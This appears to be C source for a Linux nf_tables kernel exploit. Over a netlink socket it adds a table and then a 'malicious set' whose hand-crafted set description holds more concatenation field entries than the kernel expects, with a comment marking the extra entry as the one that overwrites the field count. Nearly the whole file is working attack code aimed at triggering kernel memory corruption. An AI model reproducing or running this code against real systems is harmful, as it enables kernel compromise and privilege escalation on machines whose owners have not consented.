#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <stddef.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <errno.h>

#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>

#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/set.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>

#include "helper.h"

static void my_nftnl_set_nlmsg_build_payload(struct nlmsghdr *nlh, char * table_name, char * set_name)
{
    struct nlattr *nest1;
    struct nlattr *nest2;
    struct nlattr *nest_elem;
    int i;
    int num_exprs = 0;

    mnl_attr_put_strz(nlh, NFTA_SET_TABLE, table_name);
    mnl_attr_put_strz(nlh, NFTA_SET_NAME, set_name);
    mnl_attr_put_u32(nlh, NFTA_SET_KEY_TYPE, htonl(13));
    mnl_attr_put_u32(nlh, NFTA_SET_KEY_LEN, htonl(sizeof(uint16_t)));
    mnl_attr_put_u32(nlh, NFTA_SET_ID, htonl(1));

    nest1 = mnl_attr_nest_start(nlh, NFTA_SET_DESC);

    mnl_attr_put_u32(nlh, NFTA_SET_DESC_SIZE, htonl(20));

    nest2 = mnl_attr_nest_start(nlh, 2); // NFTA_SET_DESC_CONCAT
    for (i = 0; i < 16; i++) {
        nest_elem = mnl_attr_nest_start(nlh, NFTA_LIST_ELEM);
        mnl_attr_put_u32(nlh, 1, htonl(0x30+i)); // NFTA_SET_FIELD_LEN
        mnl_attr_nest_end(nlh, nest_elem);
    }

    // overwrite field_count
    nest_elem = mnl_attr_nest_start(nlh, NFTA_LIST_ELEM);
    mnl_attr_put_u32(nlh, 1, htonl(40)); // NFTA_SET_FIELD_LEN
    mnl_attr_nest_end(nlh, nest_elem);


    mnl_attr_nest_end(nlh, nest2);

    mnl_attr_nest_end(nlh, nest1);
}

static void send_batch(struct mnl_nlmsg_batch *batch, mnl_cb_t cb_data)
{
        struct mnl_socket *nl;
        char buf[MNL_SOCKET_BUFFER_SIZE];
        uint32_t portid;
        int ret, batching;

        nl = mnl_socket_open(NETLINK_NETFILTER);
        if (nl == NULL) {
                perror("mnl_socket_open");
                exit(EXIT_FAILURE);
        }

        if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
                perror("mnl_socket_bind");
                exit(EXIT_FAILURE);
        }
        portid = mnl_socket_get_portid(nl);

        if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                              mnl_nlmsg_batch_size(batch)) < 0) {
                perror("mnl_socket_send");
                exit(EXIT_FAILURE);
        }

        mnl_nlmsg_batch_stop(batch);

        ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        while (ret > 0) {
                ret = mnl_cb_run(buf, ret, 0, portid, cb_data, NULL);
                if (ret <= 0)
                        break;
                ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        }
        if (ret == -1) {
                perror("error");
                exit(EXIT_FAILURE);
        }
        mnl_socket_close(nl);
}

static struct nftnl_table *setup_table(uint32_t family, char * table_name)
{
        struct nftnl_table *t;

        t = nftnl_table_alloc();
        if (t == NULL) {
                perror("[!] Couldn't allocate a table");
                exit(EXIT_FAILURE);
        }

        nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, family);
        nftnl_table_set_str(t, NFTNL_TABLE_NAME, table_name);

        return t;
}

static struct nftnl_set *setup_set(uint32_t family, const char *table_name, const char *set_name)
{
    struct nftnl_set *s = NULL;

    s = nftnl_set_alloc();
    if (s == NULL) {
        perror("OOM");
        exit(EXIT_FAILURE);
    }

    nftnl_set_set_str(s, NFTNL_SET_TABLE, table_name);
    nftnl_set_set_str(s, NFTNL_SET_NAME, set_name);
    nftnl_set_set_u32(s, NFTNL_SET_FAMILY, family);
    nftnl_set_set_u32(s, NFTNL_SET_KEY_LEN, sizeof(uint16_t));
    /* inet service type, see nftables/include/datatypes.h */
    nftnl_set_set_u32(s, NFTNL_SET_KEY_TYPE, 13);
    nftnl_set_set_u32(s, NFTNL_SET_ID, 1);
    // NFTA_SET_DESC
    // NFTA_SET_DESC_SIZE
    // NFTA_SET_DESC_CONCAT
    // NFTA_SET_FIELD_LEN 
    // set NFTNL_SET_DESC_SIZE & NFTNL_SET_DESC_CONCAT == set NFTA_SET_DESC
    nftnl_set_set_u32(s, NFTNL_SET_DESC_SIZE, 20);

    nftnl_set_set_str(s, NFTNL_SET_DESC_CONCAT, "0000111122223333");

    return s;
}

void add_table(uint32_t family, char *table_name){
        struct mnl_socket *nl;
        char buf[MNL_SOCKET_BUFFER_SIZE];
        struct nlmsghdr *nlh;
        uint32_t portid, seq, table_seq;
        struct nftnl_table *t;
        struct mnl_nlmsg_batch *batch;
        int ret;

        t = setup_table(family, table_name);
        if (t == NULL)
                exit(EXIT_FAILURE);

        seq = time(NULL);
        batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

        nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
        mnl_nlmsg_batch_next(batch);

        table_seq = seq;
        nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                    NFT_MSG_NEWTABLE, family,
                                    NLM_F_CREATE | NLM_F_ACK, seq++);
        nftnl_table_nlmsg_build_payload(nlh, t);
        nftnl_table_free(t);
        mnl_nlmsg_batch_next(batch);

        nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
        mnl_nlmsg_batch_next(batch);

        send_batch(batch, NULL);

        printf("[*] table added: %s\n", table_name);
        return;
}

void add_mal_set(uint32_t family, char * table_name, char * set_name){
        struct mnl_socket *nl;
        char buf[MNL_SOCKET_BUFFER_SIZE];
        struct nlmsghdr *nlh;
        uint32_t portid, seq, set_seq;
        struct nftnl_set * s;
        struct mnl_nlmsg_batch *batch;
        int ret;

        s = setup_set(family, table_name, set_name);
        if (s == NULL)
            exit(EXIT_FAILURE);

        seq = time(NULL);
        batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

        nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
        mnl_nlmsg_batch_next(batch);

        set_seq = seq;
        nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                    NFT_MSG_NEWSET, family,
                                    NLM_F_CREATE | NLM_F_ACK, seq++);
        my_nftnl_set_nlmsg_build_payload(nlh, table_name, set_name);
        nftnl_set_free(s);
        mnl_nlmsg_batch_next(batch);

        nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
        mnl_nlmsg_batch_next(batch);

        send_batch(batch, NULL);

        printf("[*] malicious set added: %s\n", set_name);
        return;
}
